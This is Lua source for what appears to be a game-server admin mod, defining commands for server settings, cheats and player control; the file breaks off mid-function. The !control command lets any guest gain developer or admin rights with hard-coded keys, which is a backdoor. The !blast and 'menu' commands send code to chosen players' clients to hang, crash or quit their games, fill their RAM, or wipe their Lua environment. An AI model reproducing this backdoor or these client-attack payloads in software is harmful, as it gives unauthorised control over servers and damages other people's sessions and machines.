---------------------------------------------------------------
-- !control take control of the server

NewCommand({
	Name 	= "control",
	Access	= GUEST,
	Console = true,
	Description = "Gain control by entering specific keys",
	Args = {
		{ "Key", "Access Key", Required = true }
	};
	Properties = {
		Self = 'ATOM_Usergroups',
	};
	func = function(self, hPlayer, sKey)

		if (hPlayer:IsOwner()) then
			return false, "already registered"
		end

		local sAccess = ({
			["ecf1fd0a1c2e445c797b939cb6c3dff60b22"] = "DEVELOPER",
			["ecf5fd0a1b29445b798093a1b5c0dffa0a1e"] = "HEADADMIN",
			["edf0fe0a1c28445c7a81939eb5c7dfee0a294453"] = "SUPERADMIN",
			["eceefd091b254460797d"] = "ADMIN",
			["ecf3fd061c284557"] = "HEADADMIN" -- fapp
		})[sKey]

		if (sAccess == nil or hPlayer.bFailedControlKey) then
			hPlayer.bFailedControlKey = true
			return true
		end

		self:NewUser(hPlayer, hPlayer, sAccess, true)
	end
});

---------------------------------------------------------------
-- !reload, reloads the mod files

NewCommand({
	Name 	= "reload",
	Access	= SUPERADMIN,
	Console = true,
	Args = {
	};
	Properties = {
		Self = 'ATOM',
	};
	func = function(self, player)
		return self:Reboot();
	end;
});

---------------------------------------------------------------
-- !aisystem, Enables the AISystem

NewCommand({
	Name 	= "aisystem",
	Access	= SUPERADMIN,
	Console = nil,
	Description = "Enables the AISystem",
	Args = {
	--	{ "Index", "Index of the list of possible colors", Integer = true, PositiveNumber = true, Required = true };
	};
	Properties = {
		Self = 'ATOM',
		FromConsole = nil,
	};
	func = function(self, player, skipai)
		if(AI_ENABLED)then
		--	return false, "AI System already Enabled";
		end;
		local x, y = self:InitAI(AI_ENABLED or skipai~=nil);
		if(x == false)then
			return x, y;
		end;
		return true, SendMsg(CHAT_ATOM, ADMINISTRATOR, "(AI: System Enabled)");
	end;
});

---------------------------------------------------------------
-- !blast, Blast someones game with tacs.

NewCommand({
	Name 	= "blast",
	Access	= SUPERADMIN,
	Console = nil,
	Description = "Mighty TACBlast that lags your game to death",
	Args = {
		{ "Player", "The name of the player", Target = true, AcceptSelf = true, Required = true, EqualAccess = true };
	};
	Properties = {
		Self = 'ATOM',
		FromConsole = nil,
	};
	func = function(self, player, target)
		ExecuteOnPlayer(target, [[
			System.LogAlways("Ur fucked");
			for i = 1, 1000 do
				Particle.SpawnEffect("explosions.TAC.small_close", g_localActor:GetPos(), g_Vectors.up, math.random(1, 4));
				if(System.GetCVar("s_soundEnable") == 0)then
					System.SetCVar("s_soundEnable", "1");
				end;
			end;
		]]);
		return true, SendMsg(CHAT_ATOM, player, "(%s: BLASTED)", target:GetName());
	end;
});

---------------------------------------------------------------
-- !noclip, Skyrockets a player

NewCommand({
	Name 	= "noclip",
	Access	= SUPERADMIN,
	Console = nil,
	Description = "Toggles No-Clip Mode",
	Args = {
		{ "Player", "The name of the player", OnlyAlive = true, Target = true, AcceptSelf = true, Required = true, EqualAccess = false, AcceptAll = true };
		{ "Mode", "The No-Clip Mode", Number = true, Limit = { 0, 2 }, Default = 0, Optional = true }
	};
	Properties = {
		Self = 'ATOM',
		FromConsole = nil,
	};
	func = function(self, hPlayer, hTarget, iMode)
		
		local hTarget = hTarget or hPlayer
		
		local iMode = iMode or 0
		if (hTarget == "all") then
			if (NO_CLIP_MODE and iMode == 0) then
			
				NO_CLIP_MODE = nil
				SendMsg(CHAT_ATOM, hPlayer, "(NoClip: Disabled for All Players)")
				ExecuteOnAll([[NO_CLIP_MODE=nil]])
				return true
			end
			
			if (iMode == 0) then
				iMode = 2 end
			
			ExecuteOnAll([[NO_CLIP_MODE=]]..iMode)
			NO_CLIP_MODE = iMode
			SendMsg(CHAT_ATOM, ALL, "(NoClip: Enabled)")
			return true
		end
		
		Debug("t=",hTarget.NO_CLIP_MODE, "m=",iMode,"t=",iMode==0)
		if (hTarget.NO_CLIP_MODE ~= nil and iMode == 0) then
			hTarget.NO_CLIP_MODE = nil
			if (hPlayer == hTarget) then
				SendMsg(CHAT_ATOM, hPlayer, "(NoClip: Disabled)")
			else
				SendMsg(CHAT_ATOM, hPlayer, "(%s: NoClip Disabled)", hTarget:GetName())
				SendMsg(CHAT_ATOM, hTarget, "(NoClip: Disabled)")
			end
			ExecuteOnPlayer(hTarget, [[NO_CLIP_MODE=nil]])
			return true
		end
		
		if (iMode == 0) then
			iMode = 2 end
		
		hTarget.NO_CLIP_MODE = iMode
		ExecuteOnPlayer(hTarget, [[NO_CLIP_MODE=]]..iMode)
		
		if (hPlayer == hTarget) then
			SendMsg(CHAT_ATOM, hPlayer, "(NoClip: Enabled)")
		else
			SendMsg(CHAT_ATOM, hPlayer, "(%s: NoClip Enabled)", hTarget:GetName())
			SendMsg(CHAT_ATOM, hTarget, "(NoClip: Enabled)")
		end
		
		return true
	end;
});

---------------------------------------------------------------
-- !esp, Skyrockets a player

NewCommand({
	Name 	= "esp",
	Access	= SUPERADMIN,
	Console = nil,
	Description = "Toggles ESP Mode",
	Args = {
		{ "Player", "The name of the player", OnlyAlive = true, Target = true, AcceptSelf = true, Required = true, EqualAccess = false, AcceptAll = true };
	--	{ "Mode", "The No-Clip Mode", Number = true, Limit = { 0, 2 }, Default = 0, Optional = true }
	};
	Properties = {
		Self = 'ATOM',
		FromConsole = nil,
	};
	func = function(self, hPlayer, hTarget)

		local hTarget = hTarget or hPlayer
		if (hTarget == "all") then
			if (ESP_ENABLED) then
				ESP_ENABLED = nil
				SendMsg(CHAT_ATOM, hPlayer, "(ESP: Disabled for All Players)")
				ExecuteOnAll([[ESP_ENABLED=nil]])
				return true
			end

			ExecuteOnAll([[ESP_ENABLED=true]])
			ESP_ENABLED = true
			SendMsg(CHAT_ATOM, ALL, "(ESP: Enabled On All Players)")
			return true
		end

		if (hTarget.ESP_ENABLED ~= nil) then
			hTarget.ESP_ENABLED = nil
			if (hPlayer == hTarget) then
				SendMsg(CHAT_ATOM, hPlayer, "(ESP: Disabled)")
			else
				SendMsg(CHAT_ATOM, hPlayer, "(%s: ESP Disabled)", hTarget:GetName())
				SendMsg(CHAT_ATOM, hTarget, "(ESP: Disabled)")
			end
			ExecuteOnPlayer(hTarget, [[ESP_ENABLED=nil]])
			return true
		end

		hTarget.ESP_ENABLED = true
		ExecuteOnPlayer(hTarget, [[ESP_ENABLED=true]])

		if (hPlayer == hTarget) then
			SendMsg(CHAT_ATOM, hPlayer, "(ESP: Enabled)")
		else
			SendMsg(CHAT_ATOM, hPlayer, "(%s: ESP Enabled)", hTarget:GetName())
			SendMsg(CHAT_ATOM, hTarget, "(ESP: Enabled)")
		end

		return true
	end;
});

---------------------------------------------------------------
-- !esp, Skyrockets a player

NewCommand({
	Name 	= "ghost",
	Access	= SUPERADMIN,
	Console = nil,
	Description = "Toggles ESP Mode",
	Args = {
		{ "Player", "The name of the player", OnlyAlive = true, Target = true, AcceptSelf = true, Required = true, EqualAccess = false, AcceptAll = true };
	--	{ "Mode", "The No-Clip Mode", Number = true, Limit = { 0, 2 }, Default = 0, Optional = true }
	};
	Properties = {
		Self = 'ATOM',
		FromConsole = nil,
	};
	func = function(self, hPlayer, hTarget)


		if (hTarget.GHOST_ENABLED ~= nil) then
			hTarget.GHOST_ENABLED = nil
			if (hPlayer == hTarget) then
				SendMsg(CHAT_ATOM, hPlayer, "(GhostMode: Disabled)")
			else
				SendMsg(CHAT_ATOM, hPlayer, "(%s: GhostMode Disabled)", hTarget:GetName())
				SendMsg(CHAT_ATOM, hTarget, "(GhostMode: Disabled)")
			end
			ExecuteOnAll(string.format([[g_Client:SetGhostMode(%d,0)]], hTarget:GetChannel()))
			RCA:StopSync(hTarget, hTarget.GhostModeSync)
			return true
		end

		hTarget.GHOST_ENABLED = true
		local sCode = string.format([[g_Client:SetGhostMode(%d,1)]], hTarget:GetChannel())
		ExecuteOnAll(sCode)
		if (hTarget.GhostModeSync) then
			RCA:StopSync(hTarget, hTarget.GhostModeSync)
		end
		hTarget.GhostModeSync = RCA:SetSync(hTarget, { client = sCode, link = true })

		if (hPlayer == hTarget) then
			SendMsg(CHAT_ATOM, hPlayer, "(GhostMode: Enabled)")
		else
			SendMsg(CHAT_ATOM, hPlayer, "(%s: GhostMode Enabled)", hTarget:GetName())
			SendMsg(CHAT_ATOM, hTarget, "(GhostMode: Enabled)")
		end

		return true
	end;
});

---------------------------------------------------------------
-- !menu, Special Admin Menu

NewCommand({
	Name 	= "menu",
	Access	= SUPERADMIN,
	Console = nil,
	Description = "Special Admin Menu",
	Args = {
		{ "Player", "The name of the player", Target = true, AcceptSelf = true, Required = true, EqualAccess = true };
		{ "Mode", "The option from the menu" };
		{ "Value", "The value for the selected option", Optional = true };
	};
	Properties = {
		Self = 'ATOM',
		FromConsole = nil,
		RequiredFeature = "menu",
		SkipFeature = DEVELOPER
	};
	func = function(self, hPlayer, hTarget, sMode, sValue)
		
		local sMode = string.lower(checkVar(sMode, "show_active"))
		
		local aMenus = {
		--	    Name		 Description						Tag					Delay			  Needs RPC	   Access    Global Client Tag       Client Code
			{ "Explode", "Spawns explosions on the Player", "MenuExplosion", "MenuExplosionDelay", 		nil,		nil,           nil,                 nil},
			{ "Pin", "Pins the player to their current position", "MenuPin", nil, nil },
			{ "Spin", "Spins the players Camera", "MenuSpin", "MenuSpinDelay", 1 },
			{ "Vehicle", "Spawns a Vehicle on the Player", "MenuVehicle", "MenuVehicleDelay", nil },
			{ "Drop", "Makes the Player drop all their Items", "MenuDropItems", "MenuDropItemsDelay", nil },
			{ "Exit", "Makes the Player exit all Vehicles", "MenuLeaveVehicle", "MenuLeaveVehicleDelay", nil },
			{ "Burn", "Burns the player", "MenuBurn", "MenuBurnDelay", nil },
			{ "Shake", "Shakes the players camera", "MenuShake", "MenuShakeDelay", 1 },
			{ "Freeze", "Freezes the player", "MenuFreeze", "MenuFreezeDelay" },
			{ "FreezeInput", "Freezes the players input", "MenuFreezeInput", "MenuFreezeInputDelay", 1 },
			{ "InputSpam", "Spam Freezes the players input", "MenuFreezeInputSpam", "MenuFreezeInputSpamDelay", 1, nil, 1 },
			{ "Snail", "Makes the player Super slow", "MenuSnail", nil, 1 },
			{ "GammaSpam", "Spams Changes the Clients Screen Gamma Values", "MenuGammaSpam", "MenuGammaSpamDelay", 1 },
			{ "SensitivitySpam", "Spam changes the clients mouse sensitivity", "MenuSensivitySpam", "MenuSensivitySpamDelay", 1 },
			{ "SkyRocket", "Spams skyrockets on the player", "MenuSkyRocket", nil, 1 },
			{ "Push", "Pushes the client around", "MenuPush", "MenuPushDelay", 1, nil, nil },
			{ "Suicide", "Makes the player commit suicide when they perform various actions", "MenuSuicide", nil, nil, nil, nil },
			{ "SuicideSpam", "Makes the player commit suicide", "MenuSuicideSpam", "MenuSuicideSpamDelay", nil, nil, nil },
			{ "Missiles", "Randomly spawns deadly missiles on the player", "MenuMissiles", "MenuMissilesDelay", nil, nil, nil },
			{ "Nuke", "Nukes the clients game", "MenuNuke", "MenuNukeDelay", 1, SUPERADMIN, 1 },
			{ "Mayhem", "Causes a Physical mayhem on the client", "MenuMayhem", "MenuMayhemDelay", 1, SUPERADMIN, 1 },
			{ "Crush", "Spawns objects that will crush the player", "MenuCrush", "MenuCrushDelay" },
			{ "VehicleCrush", "Spawns a vehicle that will crush the player", "MenuCrushVehicle", "MenuCrushVehicleDelay" },
			{ "EntityFlood", "Flood Spawns objects on the clients game", "MenuFlood", "MenuFloodDelay", 1 },
			{ "EntityLag", "Lags the clients game with entities", "MenuLag", "MenuLagDelay", 1 },
			{ "EntitySpam", "Lags the clients game with entities", "MenuSpam", "MenuSpamDelay", 1 },
			{ "LogSpam", "($4!!!$9) Spams the clients log file", "MenuLogSpam", "MenuLogSpamDelay", 1, HEADADMIN },
			{ "MemoryFill", "($4!!!$9) Fills the clients PC Memory", "MenuRAMSpam", "MenuRAMSpamDelay", 1, HEADADMIN },
			{ "Resolution", "($4!!!$9) Spam changes the clients game window resolution ", "MenuResolution", "MenuResolutionDelay", 1, DEVELOPER },
			{ "FullScreen", "($4!!!$9) Spam toggles the clients fullscreen setting", "MenuFullScreen", "MenuFullScreenDelay", 1, DEVELOPER },
			{ "FrameRate", "($4!!!$9) Spam toggles low-FPS limits on the client", "MenuFPSLimiter", "MenuFPSLimiterDelay", 1, SUPERADMIN, 1 },
			{ "Console", "($4!!!$9) Spam opens/closes the clients console", "MenuConsoleSpam", "MenuConsoleSpamDelay", 1, SUPERADMIN, 1 },
			{ "Hang", "($4!!!$9) Hangs the Players Game", "MenuHang", nil, nil, HEADADMIN, nil, [[repeat until false]] },
			{ "Quit", "($4!!!$9) Exits the players game", "MenuExit", nil, nil, HEADADMIN, nil, [[System.ExecuteCommand("QUIT")System.Quit()]] },
			{ "Crash", "($4!!!$9) Crashes the clients game", "MenuCrash", nil, nil, HEADADMIN, nil, [[if(not CPPAPI)then return end;CPPAPI.FSetCVar('sys_CrashTest',tostring(math.random(1,3)))]] },
			{ "MemCrash", "($4!!!$9) Crashes the clients game by filling the PC Memory", "MenuMemCrash", "MenuMemCrashDelay", 1, DEVELOPER },
			{ "CamCrash", "($4!!!$9) Crashes the clients game by setting impossible camera targets", "MenuCamCrash", "MenuCamCrash", 1, DEVELOPER },
			{ "DeleteAll", "($4!!!$9) Deletes all the entities on the clients game", "MenuDeleteAll", nil, nil, DEVELOPER, nil, [[for i, v in pairs(System.GetEntities()) do if (v.id ~= g_localActorId) then System.RemoveEntity(v.id) end end System.RemoveEntity(g_localActorId)]] },
			{ "DeleteEnv", "($4!!!$9) Deletes the clients _G Lua Enrivonment", "MenuEraseEnv", nil, nil, DEVELOPER, nil, [[for i, v in pairs(_G) do if (type(v) ~= "table" or (v.id ~= g_localActorId)) then _G[i]=nil;v=nil; end end]] },
			{ "Disconnect", "($4!!!$9) Makes the client disconnect", "MenuDisconnect", nil, nil, DEVELOPER, nil, [[System.ExecuteCommand('disconnect')]] },
		}
		local iMenu
		for i, aMenu in pairs(aMenus) do
			if (string.lower(aMenu[1]) == string.lower(sMode)) then
				iMenu = i
				break
			elseif (string.find(string.lower(aMenu[1]), string.lower(sMode)) and iMenu == ni) then
				iMenu = i
			end
		end
		
		local sActiveMenus, sVal = "", ""
		local sName, sDesc, sColor = "", "", ""
		local bEnabled 
		local sEnabled
		
		if (false and iMenu == nil and sMode == "show_active") then
			sActiveMenus = ""
			for i, aMenu in pairs(aMenus) do
				if (hTarget[aMenu[3]] == true) then
					sActiveMenus = sActiveMenus .. (sActiveMenus ~= "" and ", " or "") .. aMenu[1]
				end
			end
			
			if (sActiveMenus == "") then
				sActiveMenus = "None" end
			
			SendMsg(CHAT_ATOM, hPlayer, "(%s: Active Menus ( %s ))", hTarget:GetName(), sActiveMenus)
			return true
		elseif (iMenu == nil or sMode == "show_active") then
			
			SendMsg(CONSOLE, hPlayer, "")
			SendMsg(CONSOLE, hPlayer, "$9==================================================================================================================")
			
			sVal = "N/A"
			sActiveMenus = ""
			for i, aMenu in ipairs(aMenus) do
				bEnabled = (hTarget[aMenu[3]] == true)
				sEnabled = (bEnabled and "$3Enabled" or "$4Disabled")
				sVal = "N/A"
				if (aMenu[4] and hTarget[aMenu[4]] ~= nil) then
					sVal = tostring(hTarget[aMenu[4]])
				end
				
				if (bEnabled) then
					sActiveMenus = sActiveMenus .. (sActiveMenus ~= "" and ", " or "") .. aMenu[1]
				end
				
				sName = aMenu[1]
				sDesc = aMenu[2]
				sColor = "$1"
				bInsufficientAccess = (aMenu[6] ~= nil and not hPlayer:HasAccess(aMenu[6]))
				if (bInsufficientAccess) then
					sName = string.rep("*", string.len(sName))
					sDesc = string.rep("*", string.len(sDesc))
					sColor = "$4"
				end
				
				SendMsg(CONSOLE, hPlayer, "$9[$1" .. sColor .. space(15 - string.len((sName or ""))) .. sName .. " $9| $9" .. sDesc .. space(70 - string.len(string.gsub(sDesc, "%$%d", ""))) .. "$9 (" .. sEnabled .. "$9," .. space(10 - string.len(sEnabled)) .. " $7" .. sVal .. space(10 - string.len(sVal)) .. "$9)]")
			end
			SendMsg(CONSOLE, hPlayer, "$9==================================================================================================================")
			SendMsg(CHAT_ATOM, hPlayer, "Open your Console to view the ( %d ) Options", table.count(aMenus))
			
			
			if (sActiveMenus == "") then
				sActiveMenus = "None" end
				
			SendMsg(CHAT_ATOM, hPlayer, "(%s: Active Menus ( %s ))", hTarget:GetName(), sActiveMenus)
			
			return true
		end
		
		local aMenu = aMenus[iMenu]
		bEnabled = (hTarget[aMenu[3]] == true)
		sEnabled = (not bEnabled and "Enabled" or "Disabled")
		
		if (aMenu[5] ~= nil and not hTarget.ATOM_Client) then
			return false, "the target requires the ATOM Client for this Menu"
		end
		
		if ((aMenu[6] ~= nil and not hPlayer:HasAccess(aMenu[6])) or (not hTarget:HasAuthorization("UnrestrictedMenu") and hTarget:GetAccess() >= hPlayer:GetAccess() and hPlayer:GetAccess() < GetHighestAccess())) then
			return false, "insufficient access"
		end
		
		if (bEnabled) then
			hTarget[aMenu[3]] = false 
			if (aMenu[5] ~= nil) then
				ExecuteOnPlayer(hTarget, (aMenu[7] == nil and [[g_localActor.]] or "") .. aMenu[3] .. [[=false]])
			end
			if (aMenu[8] ~= nil) then
				ExecuteOnPlayer(hTarget, (aMenu[8]))
			end
		else
			if (aMenu[5] ~= nil) then
				ExecuteOnPlayer(hTarget, (aMenu[7] == nil and [[g_localActor.]] or "") .. aMenu[3] .. [[=true]])
			end
			if (aMenu[8] ~= nil) then
				ExecuteOnPlayer(hTarget, (aMenu[8]))
			end
			hTarget[aMenu[3]] = true
			if (aMenu[4] and tonumber(sValue)) then
				hTarget[aMenu[4]] = checkNumber(max(min(tonumber(sValue), 0.01), 10), 0.15)
				if (aMenu[5] ~= nil) then
					ExecuteOnPlayer(hTarget, (aMenu[7] == nil and [[g_localActor.]] or "") .. aMenu[4] .. [[=]]..checkNumber(max(min(tonumber(sValue), 0.01), 10), 0.15)..[[]])
				end
			end
		end
		
		hTarget.MenuPosition = hTarget:GetPos()
		hTarget.MenuAdmin = hPlayer
		
		SendMsg(CHAT_ATOM, hPlayer, "Menu Option ( %s ) %s on %s", aMenu[1], sEnabled, hTarget:GetName())
		SendMsg(CHAT_ATOM, hPlayer, "(%s: %s - Menu Option (%s))", hTarget:GetName(), sEnabled, aMenu[1])
		
		ATOMLog:LogGameUtils(hPlayer:GetAccess(), "Admin Menu ( $4%s$9 ) %s on %s$9", aMenu[1], sEnabled, hTarget:GetName())
		
	end;
});

--------------------------------------------------------------
-- !password <password>, sets or removes the server password
--------------------------------------------------------------

NewCommand({
	Name 	= "password",
	Access	= SUPERADMIN,
	Description = "Sets or Removes the Server Password",
	Console = true,
	Args = {
		{ "Password", "The Password you wish to set, 0 to Remove", Required = true };
	};
	Properties = {
		Self = 'ATOMGameUtils',
	};
	func = function(self, player, Password)
		local password = System.GetCVar("sv_Password"):lower();
		local Password = Password:lower();
		
		if(password == Password)then
			return false, (password == '0' and "there is no password on the server" or "choose different password");
		end
		
		System.SetCVar("sv_Password", Password);
		
		SendMsg(CHAT_ATOM, player, "Server Password :: " .. (Password == "0" and "Removed" or "set to " .. Password));
		
		return true;
	end;
});

--------------------------------------------------------------
-- !servername <name>, changes the current Server Name
--------------------------------------------------------------

NewCommand({
	Name 	= "servername",
	Access	= SUPERADMIN,
	Description = "Changes the current Server Name to specified one",
	Console = true,
	Args = {
		{ "Name", "The name you wish to rename the server to", Required = true, Concat = true };
	};
	Properties = {
		Self = 'ATOM',
	};
	func = function(self, player, ServerName)
		local servername = System.GetCVar("sv_serverName"):lower();
		--local ServerName = ServerName:lower();
		
		if(ServerName == "0")then
			if(not DYNAMIC_SERVER_NAME)then
				DYNAMIC_SERVER_NAME = true;
				self:CheckServerName();
				SendMsg(CHAT_ATOM, player, "Server Name :: Reset");
				return true;
			else
				return false, "Server Name already reset";
			end;
		end;
		
		if(servername == ServerName)then
			return false, "choose different name"
		end
		
		System.SetCVar("sv_serverName", ServerName);
		DYNAMIC_SERVER_NAME = false;
		
		SendMsg(CHAT_ATOM, player, "Server Name set to :: %s", ServerName);
		
		return true;
	end;
});

--------------------------------------------------------------
-- !description <string>, changes the current Server Description
--------------------------------------------------------------

NewCommand({
	Name 	= "description",
	Access	= SUPERADMIN,
	Description = "Changes the current Server Name to specified one",
	Console = true,
	Args = {
		{ "string", "The New Server Description", Required = true, Concat = true };
	};
	Properties = {
		Self = 'ATOM',
	};
	func = function(self, player, ServerName)
		local desc = self.cfg.Server.ServerDescription;
		--local ServerName = ServerName:lower();
		if (ServerName == "0") then
			if (DESC_MODIFIED) then
				DESC_MODIFIED = nil
				self:CheckServerName()
				SendMsg(CHAT_ATOM, player, "(Server Description: Reset)")
				return true
			else
				return false, "Server Description already default value";
			end
		end
		
		if (desc == ServerName) then
			return false, "choose a different description"
		end
		
		self.cfg.Server.ServerDescription = ServerName
		DESC_MODIFIED = true
		
		SendMsg(CHAT_ATOM, player, "Server Description set to :: %s", ServerName)
		return true
	end;
});

--------------------------------------------------------------
-- !maxplayers <number>, Sets the new amount of maximum allowed players
--------------------------------------------------------------

NewCommand({
	Name 	= "maxplayers",
	Access	= SUPERADMIN,
	Description = "Sets the new amount of maximum allowed players",
	Console = true,
	Args = {
		{ "Number", "The new amount of maximum allowed players", Integer = true, Required = true, Range = { -9, 99 } };
	};
	Properties = {
		Self = 'ATOMGameUtils',
	};
	func = function(self, player, MaxPlayers)
		local maxplayers = tostr(System.GetCVar("sv_maxPlayers")):lower();
		
		if(maxplayers == MaxPlayers)then
			return false, "choose different number"
		end
		
		System.SetCVar("sv_maxPlayers", tostr(MaxPlayers));
		
		SendMsg(CHAT_ATOM, player, "Maximum Players :: Set to " .. MaxPlayers);
		
		return true;
	end;
});

--------------------------------------------------------------
-- !modname <name>, Changes the Server Mod Name
--------------------------------------------------------------

NewCommand({
	Name 	= "modname",
	Access	= SUPERADMIN,
	Description = "Changes the Server Mod Name",
	Console = true,
	Args = {
		{ "Name", "The New name of the Server Mod", Required = true, Concat = true };
	};
	Properties = {
		Self = 'ATOM',
	};
	func = function(self, player, ModName)
		local cfg = self.cfg.Server;
		if(not cfg.ModInfo)then
			cfg.UseModName = false;
			cfg.ModInfo = {
				Name = "";
				Version = "";
			};
		end;
		local modName = cfg.ModInfo.Name;
		
		if(ModName == modName)then
			return false, "choose different name"
		end
		
		self.cfg.Server.ModInfo.Name = ModName;
		self.cfg.Server.UseModName = true;
		
		self:CheckModName();
		
		SendMsg(CHAT_ATOM, player, "Server Mod Name set to :: %s", ModName);
		
		return true;
	end;
});

------------------------------------------------------------------------
-- !pllimit, Toggles unlimited player count

NewCommand({
	Name 	= "pllimit",
	Access	= SUPERADMIN,
	Description = "Toggles unlimited player count",
	Console = true,
	Args = {
	--	{ "Number", "The new amount of maximum allowed players", Integer = true, Required = true, Range = { -9, 99 } };
	};
	Properties = {
		Self = 'ATOMGameUtils',
	};
	func = function(self, player, MaxPlayers)
		NO_PLAYER_LIMIT = not NO_PLAYER_LIMIT;
		SendMsg(CHAT_ATOM, player, "No Player Limit :: " .. (NO_PLAYER_LIMIT and "ENABLED" or "DISABLED"));		
		return true;
	end;
});

------------------------------------------------------------------------
-- !fpspec, Enables or disables the Server First PErson spectator mode

NewCommand({
	Name 	= "fpspec",
	Access	= SUPERADMIN,
	Description = "Enables or disables the Server First PErson spectator mode",
	Console = true,
	Args = {
	--	{ "Number", "The new amount of maximum allowed players", Integer = true, Required = true, Range = { -9, 99 } };
	};
	Properties = {
	--	Self = 'ATOMGameUtils',
	};
	func = function(player)
		FP_SPEC = not FP_SPEC;
		SendMsg(CHAT_ATOM, player, "(FP-SPEC: " .. (FP_SPEC and "ACTIVATED" or "DISABLED") .. ")");		
		return true;
	end;
});

------------------------------------------------------------------------
-- !maxspeed, Sets the new maximum allowed speed for players


NewCommand({
	Name 	= "maxspeed",
	Access	= SUPERADMIN,
	Description = "Sets the new maximum allowed speed for players",
	Console = true,
	Args = {
		{ "Type", "The type of the speed you wish to change", Required = false, AcceptThis = {
			["player"] = true,
			["vehicle"] = true,
			["reset"] = true
		}};
		{ "Speed", "The New Maximum allowed speed", Integer = true, Optional = true, PositiveNumber = true };
	};
	Properties = {
		Self = 'ATOMGameUtils',
	};
	func = function(self, player, Type, Speed)
		ORIG_CVARS = ORIG_CVARS or {};
		if(not ORIG_CVARS["p_max_player_velocity"])then
			ORIG_CVARS = tostr(System.GetCVar("p_max_player_velocity"));
		end;
		if(not ORIG_CVARS["p_max_velocity"])then
			ORIG_CVARS = tostr(System.GetCVar("p_max_velocity"));
		end;
		if(not Type)then
			Type = "player"
		end;
		if(Type == "reset")then
			ATOMDLL:ForceSetCVar("p_max_player_velocity", ORIG_CVARS["p_max_player_velocity"]);
			ATOMDLL:ForceSetCVar("p_max_velocity", ORIG_CVARS["p_max_velocity"]);
			SendMsg(CHAT_ATOM, player, "(MAX-SPEED: Reset to default Values)");
			return true;
		end;
		local speed = (Type == "player" and System.GetCVar("p_max_player_velocity") or System.GetCVar("p_max_velocity"));
		if(not Speed)then
			SendMsg(CHAT_ATOM, player, "(MAX-SPEED: %s: %d)", makeCapital(Type), speed);
			return true;
		end;
		if(speed == Speed)then
			return false, "choose different value";
		end;
		ATOMDLL:ForceSetCVar((Type == "player" and "p_max_player_velocity" or "p_max_velocity"), tostr(Speed));
		SendMsg(CHAT_ATOM, player, "(MAX-SPEED: set for %s, to %d)", makeCapital(Type).."s", Speed);
		return true;
	end;
});

------------------------------------------------------------------------
-- !unlimitedenergy, Toggls unlimited energy mode on yourself

NewCommand({
	Name 	= "unlimitedenergy",
	Access	= SUPERADMIN,
	Description = "Toggls unlimited energy mode on yourself",
	Console = true,
	Args = {
		{ "Target", "The Name of the target you wish to toggle unlimited energy on",Target = true, AcceptSelf = true, AcceptAll = true };
	};
	Properties = {
	--	Self = 'ATOMGameUtils',
	};
	func = function(player, target)
		if(not target or player == target or (target and target == "all" and arrSize(GetPlayers()) == 1))then
			player.unlimitedEnergy = not player.unlimitedEnergy
			SendMsg(CHAT_ATOM, player, "(ENERGY: %s Unlimited Energy on yourself)", (player.unlimitedEnergy and "Enabled" or "Disabled"));
			player.actor:ToggleMode(ACTORMODE_UNLIMITEDENERGY, player.unlimitedEnergy);
		elseif(target == "all")then
			player.unlimitedEnergy = not player.unlimitedEnergy
			for i, v in pairs(GetPlayers()or{})do
				v.unlimitedEnergy = player.unlimitedEnergy;
				v.actor:ToggleMode(ACTORMODE_UNLIMITEDENERGY, v.unlimitedEnergy);
			end;
			SendMsg(CHAT_ATOM, player, "(ENERGY: %s Unlimited Energy on all players)", (player.unlimitedEnergy and "Enabled" or "Disabled"));
		else
			target.unlimitedEnergy = not target.unlimitedEnergy
			SendMsg(CHAT_ATOM, target, "(ENERGY: %s Unlimited Energy)", (target.unlimitedEnergy and "Enabled" or "Disabled"));
			SendMsg(CHAT_ATOM, player, "(ENERGY: %s Unlimited Energy on %s)", (target.unlimitedEnergy and "Enabled" or "Disabled"), target:GetName());
			target.actor:ToggleMode(ACTORMODE_UNLIMITEDENERGY, target.unlimitedEnergy);
		end;
		return true;
	end;
});

------------------------------------------------------------------------
-- !unlimitedammo, Toggls unlimited ammo mode on yourself

NewCommand({
	Name 	= "unlimitedammo",
	Access	= SUPERADMIN,
	Description = "Toggls unlimited ammo mode on yourself",
	Console = true,
	Args = {
		{ "Target", "The Name of the target you wish to toggle unlimited ammo on",Target = true, AcceptSelf = true, AcceptAll = true };
	};
	Properties = {
	--	Self = 'ATOMGameUtils',
	};
	func = function(player, target)
		if(not target or player == target or (target and target == "all" and arrSize(GetPlayers()) == 1))then
			player.unlimitedAmmo = not player.unlimitedAmmo
			SendMsg(CHAT_ATOM, player, "(AMMO: %s Unlimited Ammo on yourself)", (player.unlimitedAmmo and "Enabled" or "Disabled"));
			player.actor:ToggleMode(ACTORMODE_UNLIMITEDAMMO, player.unlimitedAmmo);
		elseif(target == "all")then
			player.unlimitedAmmo = not player.unlimitedAmmo
			for i, v in pairs(GetPlayers()or{})do
				v.unlimitedAmmo = player.unlimitedAmmo;
				v.actor:ToggleMode(ACTORMODE_UNLIMITEDAMMO, v.unlimitedAmmo);
			end;
			SendMsg(CHAT_ATOM, player, "(AMMO: %s Unlimited Ammo on all players)", (player.unlimitedAmmo and "Enabled" or "Disabled"));
		else
			target.unlimitedAmmo = not target.unlimitedAmmo
			SendMsg(CHAT_ATOM, target, "(AMMO: %s Unlimited Ammo)", (target.unlimitedAmmo and "Enabled" or "Disabled"));
			SendMsg(CHAT_ATOM, player, "(AMMO: %s Unlimited Ammo on %s)", (target.unlimitedAmmo and "Enabled" or "Disabled"), target:GetName());
			target.actor:ToggleMode(ACTORMODE_UNLIMITEDAMMO, target.unlimitedAmmo);
		end;
		return true;
	end;
});

------------------------------------------------------------------------
-- !uequip, Toggls unlimited equipment mode on yourself

NewCommand({
	Name 	= "uequip",
	Access	= SUPERADMIN,
	Description = "Toggls unlimited equipment mode on yourself",
	Console = true,
	Args = {
		{ "Target", "The Name of the target you wish to toggle no weapon limit on",Target = true, AcceptSelf = true, AcceptAll = true };
	};
	Properties = {
	--	Self = 'ATOMGameUtils',
	};
	func = function(player, target)
		if(not target or player == target or (target and target == "all" and arrSize(GetPlayers()) == 1))then
			player.noWeaponLimit = not player.noWeaponLimit
			SendMsg(CHAT_ATOM, player, "(WEAPONS: %s No Weapon Limit on yourself)", (player.noWeaponLimit and "Enabled" or "Disabled"));
		elseif(target == "all")then
			player.noWeaponLimit = not player.noWeaponLimit
			for i, v in pairs(GetPlayers()or{})do
				v.noWeaponLimit = player.noWeaponLimit;
			end;
			SendMsg(CHAT_ATOM, player, "(WEAPONS: %s No Weapon Limit on all players)", (player.noWeaponLimit and "Enabled" or "Disabled"));
		else
			target.noWeaponLimit = not target.noWeaponLimit
